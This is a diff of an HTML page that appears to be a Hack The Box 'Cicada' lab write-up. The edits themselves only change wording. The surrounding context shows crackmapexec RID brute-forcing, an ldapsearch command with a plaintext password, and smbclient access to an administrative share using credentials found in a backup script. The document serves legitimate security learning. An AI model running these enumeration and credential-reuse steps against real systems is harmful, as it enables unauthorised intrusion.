@@ -55,7 +55,7 @@
           ·
         </span>
         <span>
-          1551 words
+          1553 words
         </span>
         <span class="split">
           ·
@@ -172,7 +172,7 @@ smb: \&gt;
 <p class="markdown-image">
   <img src="attachment/9e484ac257c8f23b6e9d6f3bbc7fc9b1.png" alt=""  />
 </p>
-We have a default passowrd, but don&rsquo;t know a username to use it with, so let&rsquo;s run metasploit to try to enumerate the usernames:</p>
+We have a default passowrd, but don&rsquo;t know the related username to use it with, so let&rsquo;s try to enumerate the usernames:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
 └─$ crackmapexec smb cicada.htb -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute
 SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
@@ -209,7 +209,7 @@ SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC 
 SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1108: CICADA<span style="color:#ae81ff">\d</span>avid.orelious <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
 SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1109: CICADA<span style="color:#ae81ff">\D</span>ev Support <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
 SMB         cicada.htb      <span style="color:#ae81ff">445</span>    CICADA-DC        1601: CICADA<span style="color:#ae81ff">\e</span>mily.oscars <span style="color:#f92672">(</span>SidTypeUser
-</code></pre></div><p>Try to ldapsearch with this users using:</p>
+</code></pre></div><p>Trying the usernames i found that the correct one was <strong>michael.wrightson</strong>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ldapsearch -x -H ldap://cicada.htb -D <span style="color:#e6db74">&#34;Cicada\\michael.wrightson&#34;</span> -w <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> -b <span style="color:#e6db74">&#34;DC=cicada,DC=htb&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>
 </code></pre></div><ol>
 <li>
@@ -254,7 +254,7 @@ smb: <span style="color:#ae81ff">\&gt;</span>
 </code></pre></div><p><p class="markdown-image">
   <img src="attachment/b7e32f9f0bfccdedfe327877af1673bf.png" alt=""  />
 </p></p>
-<p>Once get the file analyze its content:</p>
+<p>Once got the file analyze its content:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Cicada<span style="color:#f92672">]</span>
 └─$ cat Backup_script.ps1  
 
@@ -270,7 +270,7 @@ $backupFilePath <span style="color:#f92672">=</span> Join-Path -Path $destinatio
 Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host <span style="color:#e6db74">&#34;Backup completed successfully. Backup file saved to: </span>$backupFilePath<span style="color:#e6db74">&#34;</span>
 
-</code></pre></div><p>Found other credentials inside it, login on that using smbclient to browser trough C$</p>
+</code></pre></div><p>Found other credentials inside it, use them with smbclient to browse trough C$</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">└─$ smbclient  //cicada.htb/C$ -U CICADA\\emily.oscars 
 Password for [CICADA\emily.oscars]:
 Try &#34;help&#34; to get a list of possible commands.
@@ -295,7 +295,7 @@ smb: \&gt; ls
                 4168447 blocks of size 4096. 49574 blocks available
 smb: \&gt; 
 
-</code></pre></div><p>Navigate to emily.oscars' Desktop folder and you&rsquo;ll find user flag</p>
+</code></pre></div><p>Navigate to emily.oscars' Desktop folder and you&rsquo;ll find the user flag:</p>
 <p><p class="markdown-image">
   <img src="attachment/eb966126c503e2aac24c0c3b2378726a.png" alt=""  />
 </p></p>
@@ -347,7 +347,7 @@ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</spa
 </code></pre></div><p><p class="markdown-image">
   <img src="attachment/6c4e7fc15c5e909ebca94f90ff258d6e.png" alt=""  />
 </p></p>
-<p>Then get root.txt in **C:\Users\Administrator\Desktop&gt;</p>
+<p>Then get root.txt in <strong>C:\Users\Administrator\Desktop&gt;</strong></p>
 <p><p class="markdown-image">
   <img src="attachment/1b649ffb4e75f05397d31a254f89ee84.png" alt=""  />
 </p></p>
